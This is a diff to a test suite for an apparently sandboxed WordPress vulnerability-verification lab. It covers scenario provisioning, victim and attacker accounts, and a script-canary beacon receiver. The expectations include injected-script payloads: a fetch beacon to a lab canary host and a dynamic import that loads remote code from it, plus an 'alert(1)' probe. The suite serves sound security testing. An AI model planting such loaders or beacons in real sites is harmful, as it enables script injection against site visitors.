@@ -17,6 +17,7 @@ import {
   wordPressScenario,
   nextWordPressScenario,
 } from "../../../src/profiles/wordpress/lab/scenarios.js";
+import { userRegistrationOrdinarySetupScript } from "../../../src/profiles/wordpress/lab/user-registration-adapter.js";
 
 const directories: string[] = [];
 const sha = (value: string) => `sha256:${value.repeat(64)}`;
@@ -353,6 +354,7 @@ describe("WordPress gVisor Lab", () => {
       id: scenario.id,
       digest: scenario.digest,
     });
+    expect(provisioned.handle.secondaryLocale).toBe("fr_FR");
     expect(
       commands.some((command) => command.args.includes("--comment_approved=1")),
     ).toBe(true);
@@ -364,7 +366,7 @@ describe("WordPress gVisor Lab", () => {
       ),
     ).toBe(true);
     expect(nextWordPressScenario("translation dictionary is empty")).toBe(
-      scenario.name,
+      `${scenario.id}: ${scenario.name}`,
     );
     expect(
       nextWordPressScenario("translation dictionary is empty", scenario.id),
@@ -373,6 +375,172 @@ describe("WordPress gVisor Lab", () => {
       "catalogue に無い前提",
     );
     await lab.teardown(provisioned.handle);
+  });
+
+  it("repeats the pinned ordinary registration setup in discovery and verification Labs", async () => {
+    const { lab, snapshot, setup, commands } = await fixture(
+      "ready",
+      undefined,
+      "user-registration",
+    );
+    const scenario = wordPressScenario("public-registration-and-account-v1")!;
+    expect(scenario).toMatchObject({
+      version: 1,
+      pluginSlug: "user-registration",
+      ordinaryRegistration: true,
+      adapterDigest: canonicalDigest(userRegistrationOrdinarySetupScript()),
+    });
+    const ordinarySetup = {
+      ...setup,
+      scenario: { id: scenario.id, digest: scenario.digest },
+    };
+    const discovery = await lab.provision(snapshot, ordinarySetup, {
+      purpose: "discovery",
+    });
+    expect(discovery.status).toBe("ready");
+    if (discovery.status !== "ready") return;
+    expect(await lab.teardown(discovery.handle)).toEqual({ status: "removed" });
+
+    const verification = await lab.provision(snapshot, ordinarySetup, {
+      purpose: "verification",
+    });
+    expect(verification.status).toBe("ready");
+    if (verification.status !== "ready") return;
+    expect(verification.handle.scenario).toEqual(ordinarySetup.scenario);
+    expect(verification.handle.setupDigest).toBe(discovery.handle.setupDigest);
+    const scripts = commands
+      .flatMap(({ args }) => args)
+      .filter((arg) => arg.includes("UR_Install::create_form()"));
+    expect(scripts).toHaveLength(2);
+    for (const script of scripts) {
+      expect(script).toContain("UR_Install::create_pages()");
+      expect(script).toContain('update_option("users_can_register",1)');
+      expect(script).toContain('get_option("default_role") !== "subscriber"');
+    }
+    expect(await lab.teardown(verification.handle)).toEqual({
+      status: "removed",
+    });
+  });
+
+  it("rejects the registration scenario for another plugin before containers start", async () => {
+    const { lab, snapshot, setup, commands } = await fixture();
+    const scenario = wordPressScenario("public-registration-and-account-v1")!;
+    const result = await lab.provision(snapshot, {
+      ...setup,
+      scenario: { id: scenario.id, digest: scenario.digest },
+    });
+    expect(result.status).toBe("incomplete");
+    expect(commands.some(({ args }) => args[0] === "run")).toBe(false);
+  });
+
+  it.each([
+    ["private-post-v1", "post", "lab-private-post"],
+    ["private-page-v1", "page", "lab-private-page"],
+  ] as const)(
+    "seeds a digest-pinned ordinary %s without changing privileges",
+    async (id, type, slug) => {
+      const { lab, snapshot, setup, commands } = await fixture();
+      const scenario = wordPressScenario(id)!;
+      const provisioned = await lab.provision(snapshot, {
+        ...setup,
+        scenario: { id: scenario.id, digest: scenario.digest },
+      });
+      expect(provisioned.status).toBe("ready");
+      if (provisioned.status !== "ready") return;
+      expect(provisioned.handle.scenario).toEqual({
+        id,
+        digest: scenario.digest,
+      });
+      expect(
+        commands.some(
+          ({ args }) =>
+            args.includes(`--post_type=${type}`) &&
+            args.includes("--post_status=private") &&
+            args.includes(`--post_name=${slug}`),
+        ),
+      ).toBe(true);
+      expect(
+        commands.some(({ args }) => args.includes("--role=administrator")),
+      ).toBe(false);
+      expect(nextWordPressScenario(`A private ${type} is missing`)).toBe(
+        `${id}: ${scenario.name}`,
+      );
+      expect(nextWordPressScenario(`A private ${type} is missing`, id)).toBe(
+        "catalogue に無い前提",
+      );
+      await lab.teardown(provisioned.handle);
+    },
+  );
+
+  it("does not promise a private-content scenario unless a separate locale prerequisite is met", () => {
+    const privatePost = wordPressScenario("private-post-v1")!;
+    const translation = wordPressScenario(
+      "translatepress-translation-data-v1",
+    )!;
+    const prerequisite = "A private post and secondary language enabled";
+    expect(nextWordPressScenario(prerequisite)).toBe("catalogue に無い前提");
+    expect(
+      nextWordPressScenario(prerequisite, undefined, {
+        secondaryLocaleConfigured: true,
+      }),
+    ).toBe(`${privatePost.id}: ${privatePost.name}`);
+    expect(
+      nextWordPressScenario("A private post in the secondary locale"),
+    ).toBe("catalogue に無い前提");
+    expect(
+      nextWordPressScenario(
+        "A private post in the secondary locale",
+        undefined,
+        { secondaryLocaleConfigured: true },
+      ),
+    ).toBe("catalogue に無い前提");
+    expect(
+      nextWordPressScenario("A private page in the secondary locale"),
+    ).toBe("catalogue に無い前提");
+    expect(
+      nextWordPressScenario(
+        "A private page in the secondary locale",
+        undefined,
+        { secondaryLocaleConfigured: true },
+      ),
+    ).toBe("catalogue に無い前提");
+    expect(
+      nextWordPressScenario(
+        "A private post with translation dictionary",
+        undefined,
+        {
+          secondaryLocaleConfigured: true,
+        },
+      ),
+    ).toBe("catalogue に無い前提");
+    expect(
+      nextWordPressScenario("A translated private post", undefined, {
+        secondaryLocaleConfigured: true,
+      }),
+    ).toBe("catalogue に無い前提");
+    expect(
+      nextWordPressScenario("A private page with translation", undefined, {
+        secondaryLocaleConfigured: true,
+      }),
+    ).toBe("catalogue に無い前提");
+    expect(
+      nextWordPressScenario("A private post with an approved comment"),
+    ).toBe("catalogue に無い前提");
+    expect(nextWordPressScenario("A private post and private page")).toBe(
+      "catalogue に無い前提",
+    );
+    expect(
+      nextWordPressScenario("A private page with translation dictionary"),
+    ).toBe("catalogue に無い前提");
+    expect(nextWordPressScenario("A private post in the default locale")).toBe(
+      `${privatePost.id}: ${privatePost.name}`,
+    );
+    expect(nextWordPressScenario("secondary language enabled")).toBe(
+      `${translation.id}: ${translation.name}`,
+    );
+    expect(nextWordPressScenario("secondary locale enabled")).toBe(
+      "catalogue に無い前提",
+    );
   });
 
   it("rejects a changed scenario digest before provisioning", async () => {
@@ -828,7 +996,9 @@ describe("WordPress gVisor Lab", () => {
 
   it("runs a beacon receiver and reports which page contexts made an issued script canary reach it", async () => {
     const { lab, snapshot, setup, commands, database } = await fixture();
-    const provisioned = await lab.provision(snapshot, setup);
+    const provisioned = await lab.provision(snapshot, setup, {
+      purpose: "verification",
+    });
     if (provisioned.status !== "ready") throw new Error("not ready");
     const { handle } = provisioned;
     const receiver = commands.find((command) =>
@@ -843,6 +1013,9 @@ describe("WordPress gVisor Lab", () => {
     expect(lab.prepareScriptCanary(handle)).toEqual({
       nonce: "fixed-nonce",
       beaconUrl: "http://canary:8080/b/fixed-nonce",
+      javascript:
+        'fetch("http://canary:8080/b/fixed-nonce", { method: "POST", headers: { "X-WBH-Script-Canary": "fixed-nonce" } });',
+      loaderJavascript: 'import("//canary:8080/c/fixed-nonce")',
     });
 
     const contexts = async (
@@ -878,11 +1051,19 @@ describe("WordPress gVisor Lab", () => {
     expect(
       await contexts(["/wp-admin/admin.php?page=fixture"], {
         role: "administrator",
-        paths: ["/wp-admin/admin.php?page=fixture"],
+        paths: [
+          {
+            path: "/wp-admin/admin.php?page=fixture",
+            actions: [
+              { kind: "click-text", text: "Choose a value", exact: false },
+            ],
+          },
+        ],
       }),
     ).toEqual({
       status: "observed",
       contexts: ["victim-route-page"],
+      victimRole: "administrator",
       screenshot: expect.any(Buffer),
     });
     expect(
@@ -893,6 +1074,7 @@ describe("WordPress gVisor Lab", () => {
     ).toEqual({
       status: "observed",
       contexts: ["victim-route-page"],
+      victimRole: "subscriber",
       screenshot: expect.any(Buffer),
     });
     expect(await contexts([])).toEqual({ status: "observed", contexts: [] });
@@ -931,15 +1113,31 @@ describe("WordPress gVisor Lab", () => {
       ),
     ).toBe(true);
     expect(
+      browsers.some((browser) =>
+        browser.args.includes(
+          'WBH_VISIT_ACTIONS=[{"kind":"click-text","text":"Choose a value","exact":false}]',
+        ),
+      ),
+    ).toBe(true);
+    expect(
       browsers.some(
         (browser) =>
           browser.args.includes("WBH_VISIT_PATH=/?p=8") &&
-          browser.args.includes(
+          browser.args.some((arg) =>
+            arg.startsWith("WBH_LOGIN_USER=wbh-victim-subscriber-"),
+          ) &&
+          !browser.args.includes(
             `WBH_LOGIN_USER=${handle.attackerAccounts.subscriber.username}`,
           ),
       ),
     ).toBe(true);
     expect(JSON.stringify(handle)).not.toContain("harness-admin");
+    expect(JSON.stringify(handle)).not.toContain("wbh-victim-subscriber-");
+    expect(
+      commands.some((command) =>
+        command.args.some((arg) => arg.startsWith("wbh-victim-subscriber-")),
+      ),
+    ).toBe(true);
     expect(
       await lab.observeStoredScript(handle, { routePaths: ["no-slash"] }),
     ).toEqual({ status: "unavailable" });
@@ -947,6 +1145,20 @@ describe("WordPress gVisor Lab", () => {
       await lab.observeStoredScript(handle, {
         routePaths: [],
         victim: { role: "administrator", paths: ["/\\outside.invalid"] },
+      }),
+    ).toEqual({ status: "unavailable" });
+    expect(
+      await lab.observeStoredScript(handle, {
+        routePaths: [],
+        victim: {
+          role: "administrator",
+          paths: [
+            {
+              path: "/wp-admin/",
+              actions: [{ kind: "evaluate", source: "alert(1)" }],
+            },
+          ],
+        } as unknown as WordPressVictimRoute,
       }),
     ).toEqual({ status: "unavailable" });
     expect(await lab.teardown(handle)).toEqual({ status: "removed" });
